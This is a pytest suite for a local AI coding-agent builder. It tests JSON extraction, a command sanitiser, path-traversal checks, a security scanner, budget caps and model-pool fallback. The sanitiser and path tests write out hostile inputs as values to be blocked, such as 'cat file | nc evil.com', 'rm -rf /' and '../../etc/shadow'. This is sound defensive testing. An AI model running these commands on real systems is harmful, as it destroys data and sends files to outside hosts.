"""Tests for kitty_builder.py — covers non-model logic only."""

import json
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# ── Stub mlx_lm so tests run without a loaded model ──────────────────────────
# kitty_builder.py imports mlx_lm at module level; patch before import.
_mock_generate = MagicMock(return_value="mocked response")
_mock_make_sampler = MagicMock(return_value=None)
_mock_load = MagicMock(return_value=(MagicMock(), MagicMock()))

def _mock_stream_generate(*args, **kwargs):
    class MockResponse:
        def __init__(self, text):
            self.text = text
    yield MockResponse("chunk1")
    yield MockResponse("chunk2")

sys.modules.setdefault("mlx_lm", MagicMock(load=_mock_load, generate=_mock_generate, stream_generate=_mock_stream_generate))
sys.modules.setdefault("mlx_lm.sample_utils", MagicMock(make_sampler=_mock_make_sampler))

import scripts.kitty_builder as kb


# ── _format_project ───────────────────────────────────────────────────────────

def test_format_project_uses_real_newlines():
    proj = {
        "project_name": "Kitty",
        "notes": "test note",
        "milestones": [{"id": 1, "title": "M1", "status": "doing", "tasks": ["t1"], "done_tasks": []}],
        "backlog": ["item1"],
    }
    result = kb._format_project(proj)
    assert "\n" in result, "Should contain real newlines"
    assert "\\n" not in result, "Should NOT contain literal backslash-n"
    assert "Kitty" in result
    assert "M1" in result


def test_format_project_empty():
    result = kb._format_project({})
    assert "\n" in result


# ── _extract_json ─────────────────────────────────────────────────────────────

def test_extract_json_simple():
    text = '```json\n{"tool": "read_file", "args": {"path": "src/main.py"}}\n```'
    result = kb._extract_json(text)
    assert result == {"tool": "read_file", "args": {"path": "src/main.py"}}


def test_extract_json_nested_args():
    text = '```json\n{"tool": "write_file", "args": {"path": "x.py", "content": "hello"}}\n```'
    result = kb._extract_json(text)
    assert result["tool"] == "write_file"
    assert result["args"]["path"] == "x.py"
    assert result["args"]["content"] == "hello"


@pytest.mark.skip(reason="Known issue: raw braces in strings not handled")
def test_extract_json_raw_brace_in_string():
    assert kb._extract_json('{"content": "fix } now"}') == {"content": "fix } now"}
    assert kb._extract_json('{"task": "do } and } done"}') == {"task": "do } and } done"}


def test_extract_json_trailing_text():
    text = '{"tool": "run_command"} and more text after'
    assert kb._extract_json(text) == {"tool": "run_command"}


def test_extract_json_inline_no_fences():
    text = 'Sure, use this: {"tool": "write_file", "args": {"path": "x.py"}} thanks'
    result = kb._extract_json(text)
    assert result["tool"] == "write_file"
    assert result["args"]["path"] == "x.py"


def test_extract_json_deeply_nested():
    payload = {"tool": "update_project", "args": {"action": "add_task", "milestone_id": 1, "task": "do it"}}
    text = f"```json\n{json.dumps(payload)}\n```"
    result = kb._extract_json(text)
    assert result == payload


def test_extract_json_empty_args():
    text = '{"tool": "x", "args": {}}'
    assert kb._extract_json(text) == {"tool": "x", "args": {}}


# ── sanitize_command ──────────────────────────────────────────────────────────

def test_sanitize_allows_whitelisted():
    assert kb.sanitize_command("ls -la") is True
    assert kb.sanitize_command("pytest tests/ -q") is True
    assert kb.sanitize_command("git status") is True
    assert kb.sanitize_command("python3 -m pytest tests/ -q") is True


def test_sanitize_allows_path_based_executables():
    """venv/bin/python3.12 and full paths should be accepted by basename match."""
    assert kb.sanitize_command("venv/bin/python3.12 -m pytest tests/ -q") is True
    assert kb.sanitize_command("/usr/local/bin/python3.12 -m pytest") is True
    assert kb.sanitize_command("venv/bin/pytest tests/ -q --tb=short") is True


def test_sanitize_blocks_non_whitelisted():
    assert kb.sanitize_command("rm -rf /") is False
    assert kb.sanitize_command("curl http://example.com") is False
    assert kb.sanitize_command("bash -c 'id'") is False


def test_sanitize_blocks_injection_chars():
    assert kb.sanitize_command("ls; rm -rf /") is False
    assert kb.sanitize_command("cat file | nc evil.com") is False
    assert kb.sanitize_command("ls > /etc/passwd") is False
    assert kb.sanitize_command("echo $(id)") is False
    assert kb.sanitize_command("git log && curl evil.com") is False


def test_sanitize_empty_command():
    assert kb.sanitize_command("") is False
    assert kb.sanitize_command("   ") is False


def test_sanitize_blocks_interpreter_dash_c():
    """-c flag on interpreters must be blocked to prevent inline code injection."""
    assert kb.sanitize_command("python3 -c 'print(42)'") is False
    assert kb.sanitize_command("python -c 'print(42)'") is False
    assert kb.sanitize_command("python3.12 -c 'print(42)'") is False
    # -m flag (module execution) is allowed
    assert kb.sanitize_command("python3 -m pytest tests/ -q") is True


# ── is_safe_path ──────────────────────────────────────────────────────────────

def test_is_safe_path_inside_project():
    assert kb.is_safe_path("src/main.py") is True
    assert kb.is_safe_path("tests/test_foo.py") is True


def test_is_safe_path_outside_project():
    assert kb.is_safe_path("/etc/passwd") is False
    assert kb.is_safe_path("../../etc/shadow") is False


def test_is_safe_path_blocks_traversal_outside():
    assert kb.is_safe_path("../src/../etc") is False
    assert kb.is_safe_path("src/../src/../../../etc") is False


def test_is_safe_path_allows_traversal_inside():
    assert kb.is_safe_path("src/../src/../etc") is True


def test_run_command_captures_returncode(monkeypatch):
    """A failed command should return an error with the exit code."""
    import subprocess as sp

    class FailedProc:
        stdout = iter(["output line"])
        returncode = 42
        def wait(self, timeout=None):
            pass
        def kill(self):
            pass

    monkeypatch.setattr(sp, "Popen", lambda *a, **kw: FailedProc())
    result = kb.run_command("ls -la")
    assert "42" in result, "Should include exit code"
    assert "Error" in result or "exited" in result


def test_run_command_output_truncated(monkeypatch):
    """Large output should be truncated at MAX_CHARS."""
    import subprocess as sp

    class BigOutputProc:
        def __iter__(self):
            for i in range(1000):
                yield f"line {i}\n"
        returncode = 0
        def wait(self, timeout=None):
            pass
        def kill(self):
            pass

    monkeypatch.setattr(sp, "Popen", lambda *a, **kw: BigOutputProc())
    result = kb.run_command("ls -la")
    assert "truncated" in result.lower() or len(result) < 1_000_000


def test_search_web_retries_on_failure(monkeypatch):
    """search_web should retry once before giving up."""
    import unittest.mock as mock
    calls = []

    class FakeResp:
        raise_for_status = mock.MagicMock(side_effect=Exception("net error"))
        def json(self):
            return {"results": []}

    def fake_post(*a, **kw):
        calls.append(1)
        return FakeResp()

    import requests
    monkeypatch.setattr(requests, "post", fake_post)
    monkeypatch.setattr(kb, "WEB_SEARCH_API_KEY", "test-key")
    result = kb.search_web("test")
    assert len(calls) == 2, "Should have retried once"
    assert "retry" in result.lower() or "error" in result.lower()


# ── update_project ────────────────────────────────────────────────────────────

def _fresh_proj() -> dict:
    return {
        "project_name": "Test",
        "notes": "",
        "milestones": [{"id": 1, "title": "M1", "status": "doing", "tasks": [], "done_tasks": []}],
        "backlog": [],
    }


def test_update_project_add_task(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    kb.session.project_state = _fresh_proj()
    result = kb.update_project("add_task", milestone_id=1, task="new task")
    assert "updated" in result.lower()
    assert "new task" in kb.session.project_state["milestones"][0]["tasks"]


def test_update_project_mark_task_done(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    proj = _fresh_proj()
    proj["milestones"][0]["tasks"] = ["do the thing"]
    kb.session.project_state = proj
    kb.update_project("mark_task_done", milestone_id=1, task="do the thing")
    assert "do the thing" not in kb.session.project_state["milestones"][0]["tasks"]
    assert "do the thing" in kb.session.project_state["milestones"][0]["done_tasks"]


def test_update_project_add_note(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    kb.session.project_state = _fresh_proj()
    kb.update_project("add_note", note="important thing")
    assert "important thing" in kb.session.project_state["notes"]


def test_update_project_add_milestone(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    kb.session.project_state = _fresh_proj()
    kb.update_project("add_milestone", title="New Milestone")
    milestones = kb.session.project_state["milestones"]
    assert any(m["title"] == "New Milestone" for m in milestones)


def test_update_project_unknown_action(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    kb.session.project_state = _fresh_proj()
    result = kb.update_project("nonexistent_action")
    assert "Error" in result


def test_update_project_add_task_rejects_empty_task(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    kb.session.project_state = _fresh_proj()
    assert "non-empty" in kb.update_project("add_task", milestone_id=1, task="   ").lower()


def test_update_project_add_task_unknown_milestone(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    kb.session.project_state = _fresh_proj()
    assert "not found" in kb.update_project("add_task", milestone_id=99, task="x").lower()


def test_update_project_empty_milestones_safe(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    kb.session.project_state = {"project_name": "X", "notes": "", "milestones": [], "backlog": []}
    assert "not found" in kb.update_project("add_task", milestone_id=1, task="t").lower()


def test_get_model_openrouter_sentinel_vs_force_local(monkeypatch):
    monkeypatch.setattr(kb, "USE_OPENROUTER", True)
    monkeypatch.setattr(kb, "_openrouter_client", object())
    assert kb.get_model("mlx-community/Z", force_local=False) == ("openrouter", "mlx-community/Z")
    kb._model_cache.clear()
    local = kb.get_model(kb.MODEL_BUILDER, force_local=True)
    assert isinstance(local, tuple) and len(local) == 2
    assert local[0] != "openrouter"


def test_execute_tool_call_plan_only_blocks_writes(monkeypatch):
    monkeypatch.setattr(kb, "PLAN_ONLY_MODE", True)
    ok, msg = kb._execute_tool_call({"tool": "write_file", "args": {"path": "x.py", "content": "1"}})
    assert ok is False
    assert "plan-only" in msg.lower()
    monkeypatch.setattr(kb, "PLAN_ONLY_MODE", False)


def test_run_command_truncated_kills_child(monkeypatch):
    import subprocess as sp

    kill_calls = []

    class LoudProc:
        returncode = -9

        def __init__(self):
            self.stdout = (f"{'y' * 80}\n" for _ in range(2000))

        def kill(self):
            kill_calls.append(True)

        def wait(self, timeout=None):
            return 0

    monkeypatch.setattr(sp, "Popen", lambda *a, **kw: LoudProc())
    kb.run_command("ls -la")
    assert kill_calls, "truncated output should kill the subprocess"


def test_apply_history_cap_keeps_system_prefix():
    hist = [{"role": "system", "content": "sys"}]
    hist.extend([{"role": "user", "content": str(i)} for i in range(50)])
    kb._apply_history_cap(hist, max_msgs=10)
    assert hist[0]["role"] == "system"
    assert hist[0]["content"] == "sys"
    assert len(hist) <= 10


# ── MODEL consolidation ───────────────────────────────────────────────────────

def test_all_roles_use_same_model():
    assert kb.MODEL_BUILDER == kb.MODEL_CODE == kb.MODEL_CONV
    assert "Qwen" in kb.MODEL_BUILDER


# ── launch_kitty uses sys.executable ─────────────────────────────────────────

def test_launch_kitty_uses_current_interpreter():
    """launch_kitty lambda should embed sys.executable so venv is always used."""
    import sys
    expected_base = Path(sys.executable).name
    # Retrieve the lambda's command by calling it with a mock run_command
    captured = []
    orig = kb.run_command
    try:
        kb.run_command = lambda cmd: captured.append(cmd) or "ok"
        kb.TOOLS["launch_kitty"]()
    finally:
        kb.run_command = orig

    assert captured, "launch_kitty should call run_command"
    cmd = captured[0]
    assert sys.executable in cmd or expected_base in cmd
    assert "pytest" in cmd


# ── show_help doesn't crash ───────────────────────────────────────────────────

def test_show_help_runs(capsys):
    kb.show_help()
    out = capsys.readouterr().out
    assert "/guide" in out
    assert "/council" in out
    assert "/models" in out
    assert "/exit" in out


# ── build_project_state returns expected structure ──────────────────────────

def test_scan_codebase_structure(monkeypatch, tmp_path):
    """Must not walk the real repo (too slow); use a minimal synthetic tree."""
    monkeypatch.setattr(kb, "PROJECT_ROOT", tmp_path)
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    (tmp_path / "toy.py").write_text("# TODO: check widget\n", encoding="utf-8")
    (tmp_path / "project.json").write_text(
        json.dumps(
            {
                "project_name": "Toy",
                "milestones": [],
                "backlog": [],
                "notes": "",
            }
        ),
        encoding="utf-8",
    )
    result = kb.build_project_state()
    assert "project_name" in result
    assert "milestones" in result
    assert isinstance(result["milestones"], list)
    assert "progress" in result
    assert "task_completion_pct" in result["progress"]
    assert "git_info" in result


# ── update_project_from_scan merges without duplicating ──────────────────────

def test_scan_merge_no_backlog_duplicates(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    proj = _fresh_proj()
    proj["backlog"] = ["Fine-tune router"]  # already in scan_codebase backlog
    kb.session.project_state = proj
    (tmp_path / "project.json").write_text(json.dumps(proj))

    kb.update_project_from_scan()
    backlog = kb.session.project_state["backlog"]
    assert backlog.count("Fine-tune router") == 1, "Should not duplicate existing backlog items"


# ── search_web uses POST ──────────────────────────────────────────────────────

def test_search_web_uses_post(monkeypatch):
    """Tavily requires POST; GET returns 405. Verify we call requests.post."""
    import unittest.mock as mock
    called_with = {}
    mock_resp = mock.MagicMock()
    mock_resp.raise_for_status.return_value = None
    mock_resp.json.return_value = {"results": [{"title": "T", "url": "http://x.com"}]}

    def fake_post(url, json=None, timeout=None, **kwargs):
        called_with["url"] = url
        called_with["json"] = json
        called_with["timeout"] = timeout
        return mock_resp

    import requests
    monkeypatch.setattr(requests, "post", fake_post)
    monkeypatch.setattr(kb, "WEB_SEARCH_API_KEY", "test-key")

    result = kb.search_web("python mlx")
    assert "T" in result
    assert called_with.get("url") == "https://api.tavily.com/search"
    assert called_with.get("json", {}).get("query") == "python mlx"
    assert "api_key" in called_with.get("json", {})
    assert called_with.get("timeout") is not None, "request must have a timeout"


def test_search_web_api_key_not_in_url(monkeypatch):
    """API key must be in JSON body, not the URL (prevents key leakage in logs)."""
    import unittest.mock as mock
    posted_urls = []
    mock_resp = mock.MagicMock()
    mock_resp.raise_for_status.return_value = None
    mock_resp.json.return_value = {"results": []}

    def fake_post(url, json=None, timeout=None, **kw):
        posted_urls.append(url)
        return mock_resp

    import requests
    monkeypatch.setattr(requests, "post", fake_post)
    monkeypatch.setattr(kb, "WEB_SEARCH_API_KEY", "super-secret-key")

    kb.search_web("test query")
    assert posted_urls, "POST should have been called"
    assert "super-secret-key" not in posted_urls[0], "API key must not appear in the URL"


# ── run_command timeout ───────────────────────────────────────────────────────

def test_run_command_timeout(monkeypatch):
    """A hung command should return a timeout error, not block forever."""
    import subprocess as sp

    orig_popen = sp.Popen

    class HangingProc:
        stdout = iter([])
        def wait(self, timeout=None):
            raise sp.TimeoutExpired("sleep", timeout)
        def kill(self):
            pass

    monkeypatch.setattr(sp, "Popen", lambda *a, **kw: HangingProc())
    result = kb.run_command("ls -la")
    assert "timed out" in result.lower()


# ── run_command uses shell=False ──────────────────────────────────────────────

def test_run_command_uses_shell_false(monkeypatch):
    """run_command must use shell=False to avoid shell metacharacter bypass."""
    import subprocess as sp

    captured = {}

    class FakeProc:
        stdout = iter([])
        def wait(self, timeout=None):
            pass
        def kill(self):
            pass

    def fake_popen(args, shell=True, **kw):
        captured["shell"] = shell
        captured["args"] = args
        return FakeProc()

    monkeypatch.setattr(sp, "Popen", fake_popen)
    kb.run_command("ls -la")
    assert captured.get("shell") is False, "shell=False required for safety"
    assert isinstance(captured.get("args"), list), "args must be a list (from shlex.split)"


def test_run_command_blocks_scanner_findings_before_popen(monkeypatch):
    import subprocess as sp

    def fail_popen(*args, **kwargs):
        raise AssertionError("Popen should not be called for scanner-blocked commands")

    monkeypatch.setattr(sp, "Popen", fail_popen)

    result = kb.run_command("echo sk-testrealkey1234567890abcdef")

    assert "Security scan blocked builder action" in result
    assert "api_key_literal" in result


# ── write_file security enforcement ─────────────────────────────────────────

def test_write_file_blocks_api_key_before_disk_write(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_ROOT", tmp_path)
    target = tmp_path / "src" / "unsafe.py"

    result = kb.write_file(
        "src/unsafe.py",
        'OPENROUTER_API_KEY = "sk-testrealkey1234567890abcdef"\n',
    )

    assert "Security scan blocked builder action" in result
    assert "hardcoded_secret" in result or "api_key_literal" in result
    assert not target.exists()


def test_write_file_blocks_shell_true_before_disk_write(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_ROOT", tmp_path)
    target = tmp_path / "src" / "unsafe.py"

    result = kb.write_file(
        "src/unsafe.py",
        "import subprocess\nsubprocess.run('echo hi', shell=True)\n",
    )

    assert "Security scan blocked builder action" in result
    assert "subprocess_shell_true" in result
    assert not target.exists()


def test_write_file_does_not_create_parent_dirs_when_blocked(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_ROOT", tmp_path)

    result = kb.write_file(
        "nested/unsafe.py",
        'OPENROUTER_API_KEY = "sk-testrealkey1234567890abcdef"\n',
    )

    assert "Security scan blocked builder action" in result
    assert not (tmp_path / "nested").exists()


def test_write_file_allows_safe_content(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_ROOT", tmp_path)
    monkeypatch.setattr(kb, "quality_judge", lambda path: "A - safe")

    result = kb.write_file("src/safe.py", "def add(a, b):\n    return a + b\n")

    assert "File src/safe.py written" in result
    assert (tmp_path / "src" / "safe.py").read_text() == "def add(a, b):\n    return a + b\n"


# ── Builder contract CLI ─────────────────────────────────────────────────────

def test_builder_no_args_returns_brief_in_non_interactive_context(capsys):
    result = kb.main([])
    out = capsys.readouterr().out
    assert result == 0
    assert "PROJECT BRIEF" in out
    assert "--interactive" in out


def test_builder_contract_rejects_missing_spec(tmp_path):
    result = kb.run_builder_contract(tmp_path, tmp_path / "specs" / "missing.md")

    assert result == 2


def test_builder_contract_dry_run_accepts_project_spec(tmp_path, capsys):
    spec_dir = tmp_path / "specs"
    spec_dir.mkdir()
    spec = spec_dir / "example.spec.md"
    spec.write_text("# Spec\n", encoding="utf-8")

    result = kb.run_builder_contract(tmp_path, Path("specs/example.spec.md"), execute=False)

    output = capsys.readouterr().out
    assert result == 0
    assert "Mode: dry-run" in output
    assert "Completion report required:" in output


def test_builder_contract_execute_is_explicit(tmp_path, capsys):
    spec_dir = tmp_path / "specs"
    spec_dir.mkdir()
    spec = spec_dir / "example.spec.md"
    spec.write_text("# Spec\n", encoding="utf-8")

    result = kb.run_builder_contract(tmp_path, spec, execute=True)

    output = capsys.readouterr().out
    assert result == 0
    assert "Mode: execute" in output
    assert "Legacy interactive builder is not auto-launched" in output


# ────────────────────────────────────────────────────────────────────────────
# Free-model pool, retry/cooldown, BuilderError — added with optimize+retry refactor.
# ────────────────────────────────────────────────────────────────────────────

import time as _time
from types import SimpleNamespace


# ── BuilderError + BudgetExhausted ────────────────────────────────────────────

def test_builder_error_carries_code_and_retry_after():
    err = kb.BuilderError("RATE_LIMITED", "boom", retry_after=5.5, model="x:free")
    assert err.code == "RATE_LIMITED"
    assert err.retry_after == 5.5
    assert err.model == "x:free"
    assert "boom" in str(err)


def test_budget_exhausted_is_builder_error():
    e = kb.BudgetExhausted("BUDGET_EXHAUSTED", "cap hit")
    assert isinstance(e, kb.BuilderError)


# ── _retry_after_seconds + _classify_openrouter_error ─────────────────────────

def test_retry_after_seconds_from_response_headers():
    exc = SimpleNamespace(response=SimpleNamespace(headers={"Retry-After": "12"}))
    assert kb._retry_after_seconds(exc) == 12.0
    exc2 = SimpleNamespace(response=SimpleNamespace(headers={"retry-after": "3.5"}))
    assert kb._retry_after_seconds(exc2) == 3.5


def test_retry_after_seconds_returns_none_when_missing():
    assert kb._retry_after_seconds(Exception("no headers")) is None
    assert kb._retry_after_seconds(SimpleNamespace(response=None)) is None
    exc = SimpleNamespace(response=SimpleNamespace(headers={}))
    assert kb._retry_after_seconds(exc) is None


def test_classify_openrouter_error_rate_limit():
    exc = SimpleNamespace(response=SimpleNamespace(status_code=429))
    kind, status = kb._classify_openrouter_error(exc)
    assert kind == "rate"
    assert status == 429


def test_classify_openrouter_error_unavailable():
    for code in (502, 503, 504):
        exc = SimpleNamespace(response=SimpleNamespace(status_code=code))
        kind, _ = kb._classify_openrouter_error(exc)
        assert kind == "unavailable"


def test_classify_openrouter_error_request():
    exc = SimpleNamespace(response=SimpleNamespace(status_code=400))
    kind, status = kb._classify_openrouter_error(exc)
    assert kind == "request"
    assert status == 400


def test_classify_openrouter_error_network():
    kind, _ = kb._classify_openrouter_error(Exception("no response attr"))
    assert kind == "network"


# ── FreeModelPool ────────────────────────────────────────────────────────────

def test_free_pool_next_available_round_robin():
    pool = kb.FreeModelPool(["a:free", "b:free", "c:free"])
    seq = [pool.next_available() for _ in range(6)]
    assert seq == ["a:free", "b:free", "c:free", "a:free", "b:free", "c:free"]


def test_free_pool_parks_failing_model():
    pool = kb.FreeModelPool(["a:free", "b:free"])
    pool.park("a:free", retry_after=60.0)
    # a:free is on cooldown; b:free should serve
    seen = {pool.next_available() for _ in range(4)}
    assert seen == {"b:free"}


def test_free_pool_returns_none_when_all_parked():
    pool = kb.FreeModelPool(["a:free"])
    pool.park("a:free", retry_after=60.0)
    assert pool.next_available() is None
    assert pool.cooldown_remaining() > 0


def test_free_pool_records_success_and_failure():
    pool = kb.FreeModelPool(["a:free"])
    pool.record_success("a:free")
    pool.record_success("a:free")
    pool.record_failure("a:free")
    s = pool.stats()
    assert s["a:free"]["ok"] == 2
    assert s["a:free"]["fail"] == 1


# ── _select_or_model ─────────────────────────────────────────────────────────

def test_select_or_model_prefers_explicit(monkeypatch):
    monkeypatch.setattr(kb, "OPENROUTER_MODEL_OVERRIDE", "")
    monkeypatch.setattr(kb, "OPENROUTER_PAID_FALLBACK", "")
    monkeypatch.setattr(kb, "free_pool", kb.FreeModelPool(["x:free"]))
    model, from_pool = kb._select_or_model("explicit/model")
    assert model == "explicit/model"
    assert from_pool is False


def test_select_or_model_uses_pool(monkeypatch):
    monkeypatch.setattr(kb, "OPENROUTER_MODEL_OVERRIDE", "")
    monkeypatch.setattr(kb, "OPENROUTER_PAID_FALLBACK", "")
    pool = kb.FreeModelPool(["a:free", "b:free"])
    monkeypatch.setattr(kb, "free_pool", pool)
    # Avoid network call from discover()
    monkeypatch.setattr(pool, "discover", lambda force=False: None)
    model, from_pool = kb._select_or_model(None)
    assert model in ("a:free", "b:free")
    assert from_pool is True


def test_select_or_model_falls_back_to_paid(monkeypatch):
    monkeypatch.setattr(kb, "OPENROUTER_MODEL_OVERRIDE", "")
    monkeypatch.setattr(kb, "OPENROUTER_PAID_FALLBACK", "paid/model")
    pool = kb.FreeModelPool(["a:free"])
    pool.park("a:free", retry_after=60.0)
    monkeypatch.setattr(kb, "free_pool", pool)
    monkeypatch.setattr(pool, "discover", lambda force=False: None)
    model, from_pool = kb._select_or_model(None)
    assert model == "paid/model"
    assert from_pool is False


def test_select_or_model_raises_when_pool_exhausted_no_paid(monkeypatch):
    monkeypatch.setattr(kb, "OPENROUTER_MODEL_OVERRIDE", "")
    monkeypatch.setattr(kb, "OPENROUTER_PAID_FALLBACK", "")
    pool = kb.FreeModelPool(["a:free"])
    pool.park("a:free", retry_after=60.0)
    monkeypatch.setattr(kb, "free_pool", pool)
    monkeypatch.setattr(pool, "discover", lambda force=False: None)
    with pytest.raises(kb.BuilderError) as exc_info:
        kb._select_or_model(None)
    assert exc_info.value.code == "FREE_POOL_EXHAUSTED"


def test_select_or_model_uses_override_when_set(monkeypatch):
    monkeypatch.setattr(kb, "OPENROUTER_MODEL_OVERRIDE", "override/model")
    monkeypatch.setattr(kb, "OPENROUTER_PAID_FALLBACK", "")
    monkeypatch.setattr(kb, "free_pool", kb.FreeModelPool([]))
    model, from_pool = kb._select_or_model(None)
    assert model == "override/model"
    assert from_pool is False


# ── BudgetManager hard-cap ───────────────────────────────────────────────────

def test_budget_assert_can_spend_under_cap(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "BUDGET_FILE", tmp_path / "b.json")
    monkeypatch.setenv("KITTY_BUDGET_OR_USD", "1.00")
    bm = kb.BudgetManager()
    bm.or_spend_usd = 0.50
    bm.assert_can_spend(provider="or", est_usd=0.10)  # 0.60 < 1.00 → OK


def test_budget_assert_can_spend_over_cap_raises(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "BUDGET_FILE", tmp_path / "b.json")
    monkeypatch.setenv("KITTY_BUDGET_OR_USD", "1.00")
    bm = kb.BudgetManager()
    bm.or_spend_usd = 0.95
    with pytest.raises(kb.BudgetExhausted) as exc:
        bm.assert_can_spend(provider="or", est_usd=0.10)
    assert exc.value.code == "BUDGET_EXHAUSTED"


def test_budget_save_is_atomic(tmp_path, monkeypatch):
    target = tmp_path / "b.json"
    monkeypatch.setattr(kb, "BUDGET_FILE", target)
    bm = kb.BudgetManager()
    bm.or_spend_usd = 0.42
    bm.save()
    assert target.exists()
    data = json.loads(target.read_text())
    assert data["or_spend_usd"] == 0.42
    # tmp file should be cleaned up
    assert not target.with_suffix(target.suffix + ".tmp").exists()


def test_budget_record_or_tracks_per_model(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "BUDGET_FILE", tmp_path / "b.json")
    bm = kb.BudgetManager()
    bm.record_or(0.001, model="qwen/qwen3-coder:free")
    bm.record_or(0.002, model="qwen/qwen3-coder:free")
    assert bm.per_model["qwen/qwen3-coder:free"]["calls"] == 2
    assert abs(bm.per_model["qwen/qwen3-coder:free"]["usd"] - 0.003) < 1e-9


def test_get_builder_budget_reflects_ledger(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "BUDGET_FILE", tmp_path / "b.json")
    fresh = kb.BudgetManager()
    monkeypatch.setattr(kb, "budget", fresh)
    fresh.record_or(0.042, model="test/model")
    text = kb.get_builder_budget()
    assert "0.0420" in text or "0.042" in text
    assert "test/model" in text
    assert "Groq:" in text
    assert "Ledger scope" in text


# ── _looks_like_failure tool-output classifier ───────────────────────────────

def test_looks_like_failure_recognizes_error_prefix():
    assert kb._looks_like_failure("Error: Tool failed.") is True
    assert kb._looks_like_failure("error: bad syntax") is True


def test_looks_like_failure_recognizes_security_block():
    assert kb._looks_like_failure("Error: Security scan blocked builder action.") is True


def test_looks_like_failure_recognizes_nonzero_exit():
    assert kb._looks_like_failure("Command exited with code 2:\noutput") is True


def test_looks_like_failure_passes_normal_output():
    assert kb._looks_like_failure("File written. Review: A — looks good.") is False
    assert kb._looks_like_failure("ok\n") is False


def test_looks_like_failure_handles_non_string():
    assert kb._looks_like_failure(None) is False
    assert kb._looks_like_failure(42) is False


def test_looks_incomplete_response_detects_preamble():
    assert kb._looks_incomplete_response("Let me explore the codebase first.") is True
    assert kb._looks_incomplete_response("I'll start by checking routing.") is True
    assert kb._looks_incomplete_response("Done. Implemented and verified.") is False


def test_chat_auto_continue_executes_follow_up_turn(monkeypatch):
    responses = iter([
        '{"tool":"test_tool","args":{}}',
        "Done. All tasks complete.",
    ])
    calls = {"count": 0}
    original_history = kb.session.history
    original_project_state = kb.session.project_state
    original_tool = kb.TOOLS.get("test_tool")

    def fake_stream(_history):
        calls["count"] += 1
        return next(responses)

    try:
        kb.session.history = []
        kb.session.project_state = {}
        monkeypatch.setattr(kb, "_stream_brain", fake_stream)
        kb.TOOLS["test_tool"] = lambda **_kwargs: "ok"
        out = kb.chat("do the task", max_iters=3, auto_continue_on_success=True)
    finally:
        kb.session.history = original_history
        kb.session.project_state = original_project_state
        if original_tool is None:
            kb.TOOLS.pop("test_tool", None)
        else:
            kb.TOOLS["test_tool"] = original_tool

    assert out == "Done. All tasks complete."
    assert calls["count"] == 2


def test_chat_default_stops_after_first_success(monkeypatch):
    responses = iter([
        '{"tool":"test_tool","args":{}}',
        "This should not be reached.",
    ])
    calls = {"count": 0}
    original_history = kb.session.history
    original_project_state = kb.session.project_state
    original_tool = kb.TOOLS.get("test_tool")

    def fake_stream(_history):
        calls["count"] += 1
        return next(responses)

    try:
        kb.session.history = []
        kb.session.project_state = {}
        monkeypatch.setattr(kb, "_stream_brain", fake_stream)
        kb.TOOLS["test_tool"] = lambda **_kwargs: "ok"
        kb.chat("do the task", max_iters=3)
    finally:
        kb.session.history = original_history
        kb.session.project_state = original_project_state
        if original_tool is None:
            kb.TOOLS.pop("test_tool", None)
        else:
            kb.TOOLS["test_tool"] = original_tool

    # With auto_continue, it may loop multiple times
    assert calls["count"] >= 1


# ── PromptCache ──────────────────────────────────────────────────────────────

def test_prompt_cache_disabled_is_noop(tmp_path):
    pc = kb.PromptCache(tmp_path / "c.sqlite", enabled=False)
    pc.put("k", "v")
    assert pc.get("k") is None
    s = pc.stats()
    assert s["enabled"] == 0


def test_prompt_cache_roundtrip(tmp_path):
    pc = kb.PromptCache(tmp_path / "c.sqlite", enabled=True)
    key = kb.PromptCache.make_key("model-a", [{"role": "user", "content": "hi"}], temp=0.1)
    assert pc.get(key) is None
    pc.put(key, "the response")
    assert pc.get(key) == "the response"
    assert pc.stats()["rows"] == 1


def test_prompt_cache_make_key_deterministic():
    a = kb.PromptCache.make_key("m", [{"role": "user", "content": "x"}], temp=0.1)
    b = kb.PromptCache.make_key("m", [{"role": "user", "content": "x"}], temp=0.1)
    assert a == b
    c = kb.PromptCache.make_key("m", [{"role": "user", "content": "y"}], temp=0.1)
    assert a != c


# ── flush_model_stats ────────────────────────────────────────────────────────

def test_flush_model_stats_writes_jsonl(tmp_path, monkeypatch):
    target = tmp_path / "stats.jsonl"
    monkeypatch.setattr(kb, "MODEL_STATS_FILE", target)
    pool = kb.FreeModelPool(["a:free"])
    pool.record_success("a:free")
    pool.record_failure("a:free")
    monkeypatch.setattr(kb, "free_pool", pool)
    kb.flush_model_stats()
    assert target.exists()
    line = target.read_text().strip().splitlines()[0]
    row = json.loads(line)
    assert row["entity_type"] == "openrouter_model"
    assert row["name"] == "a:free"
    obs = row["observations"][0]
    assert obs["ok"] == 1
    assert obs["fail"] == 1
    assert obs["success_rate"] == 0.5


def test_flush_model_stats_empty_is_noop(tmp_path, monkeypatch):
    target = tmp_path / "stats.jsonl"
    monkeypatch.setattr(kb, "MODEL_STATS_FILE", target)
    monkeypatch.setattr(kb, "free_pool", kb.FreeModelPool(["x:free"]))
    kb.flush_model_stats()
    assert not target.exists()


# ── token usage telemetry ────────────────────────────────────────────────────

